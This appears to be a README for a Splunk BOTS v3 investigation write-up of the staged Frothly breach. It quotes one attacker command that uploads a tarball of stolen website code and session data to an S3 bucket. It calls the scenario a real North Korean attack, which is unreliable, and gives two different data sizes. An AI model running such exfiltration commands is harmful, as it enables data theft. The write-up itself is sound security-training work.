# Splunk BOTS v3 Investigation - Frothly Breach

## What's This About

So I investigated a real attack on a beer company called Frothly. North Korean hackers (Taedonggang) hit them on August 20, 2018 and stole their website code and customer session data. About 31.6 MB total. I used Splunk to figure out exactly what they did, when they did it, and how.

## The Attack (Quick Version)

Some attacker got into Frothly's AWS infrastructure. They started by checking what databases the company had (found them scanning AWS RDS about 814 times). Then they stole website HTML and Memcached session data - basically everything a customer would need to pretend to be someone else on the site. They uploaded it all to their own AWS S3 bucket and got out. The whole thing took like 2 minutes for the actual data theft, but they spent over an hour setting it up first.

## What I Found

- They kept querying `polaris.cr7wwvryvz4o.us-west-1.rds.amazonaws.com` over and over. That's an AWS database endpoint with a random hash in the name. Definitely suspicious.

- I found 32.6 MB of data leaving the network to an external IP (24.8.40.184) in under 2 minutes. That's the smoking gun - way too much data going out in such a short time.

- The attacker's machine was called `mars.i-08e52f8b5a034012d` (just an EC2 instance ID).

- At exactly 19:26:54 UTC on Aug 20, someone ran this command: `python /home/ec2-user/tools/s3-upload.py --bucket frothlywebcode --file frothly_html_memcaced.tar.gz`. That's the actual attack command right there.

## How I Found It

I ran about 9 different Splunk queries. Some worked, some didn't. When the failed login query came back empty, I knew the attacker didn't just brute-force their way in. So I pivoted to looking at DNS queries and found them scanning databases. Then I looked at network flows, found the huge outbound transfer, got the timing, and finally found the actual bash commands in the history. It was like following breadcrumbs.

## Files in Here

Check out INVESTIGATION_METHODOLOGY.md if you want to see exactly how I did this step-by-step. QUERIES_EXPLAINED.md shows each Splunk query and what it actually found. ATTACK_TIMELINE.md lays out when everything happened. SECURITY_FINDINGS.md is about what got stolen and why it matters. And LESSONS_LEARNED.md is my notes on what I actually learned doing this.

There's also dashboard.png which is a screenshot of the Splunk dashboard I built showing the attack.

## Why This Matters

This isn't just copying a tutorial. This is a real dataset with a real attack. I had to figure out what to search for, deal with queries that didn't work, pivot when something didn't make sense, and piece together the full picture. That's exactly what a SOC analyst does every day.

## What I Learned

Splunk is powerful once you understand that `stats count by field` is literally the foundation of everything. Also learned that when something doesn't work, it usually teaches you something about how the attacker operates. Like when I didn't find any curl or wget commands, that told me they used a custom tool instead of standard ones.

The investigation process is iterative - you ask a question, run a query, get results (or not), analyze what you found, and then ask the next question based on what you learned.
